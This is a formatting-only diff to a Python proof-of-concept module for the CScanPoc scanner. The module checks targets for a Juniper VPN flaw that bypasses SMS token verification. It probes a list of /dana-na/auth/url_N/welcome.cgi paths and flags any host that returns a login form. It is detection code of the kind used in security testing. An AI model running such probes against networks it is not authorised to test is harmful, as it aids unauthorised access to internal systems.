@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
     vuln_id = 'Juniper_0002'  # 平台漏洞编号，留空
     name = 'Juniper VPN 存在缺陷可绕过短信token验证导致漫游内网'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2015-10-26'  # 漏洞公布时间
     desc = '''
         Juniper 一般是通过AD域验证或者预设账号验证，但是现在安全意识越来越好了，厂商们纷纷加入了短信，动态token验证，
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Juniper'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '78b8fc76-bed1-4df6-87be-bc8821c726f7'
@@ -36,7 +38,7 @@ class Poc(ABPoc):
 
             hh = hackhttp.hackhttp()
             arg = self.target
-            payloads=(
+            payloads = (
                 '/dana-na/auth/url_2/welcome.cgi',
                 '/dana-na/auth/url_1/welcome.cgi',
                 '/dana-na/auth/url_3/welcome.cgi',
@@ -45,9 +47,9 @@ class Poc(ABPoc):
             )
             for p in payloads:
                 url = arg + p
-                code2, head, res, errcode, _ = hh.http(url )
-                if (code2 ==200) and ('action="login.cgi" method="POST' in res):  
-                    #security_warning(url)
+                code2, head, res, errcode, _ = hh.http(url)
+                if (code2 == 200) and ('action="login.cgi" method="POST' in res):
+                    # security_warning(url)
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
 
@@ -56,6 +58,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
